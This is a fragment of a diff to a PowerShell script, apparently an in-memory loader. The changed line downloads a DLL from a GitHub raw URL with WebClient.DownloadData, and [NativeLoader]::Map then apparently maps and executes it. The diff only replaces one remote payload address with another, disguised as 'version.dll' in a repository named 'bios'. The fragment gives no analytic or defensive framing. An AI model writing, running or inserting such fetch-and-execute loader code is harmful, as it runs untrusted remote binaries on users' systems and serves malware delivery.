@@ -219,7 +219,7 @@ catch {
     $type = [NativeLoader]
 }
 
-$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/rsindian511-star/69s/raw/refs/heads/main/PlayBoyCorp.RuntimeLdr.dll");
+$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll");
 
 [NativeLoader]::Map($bytes, $true)
 Invoke-Finalize
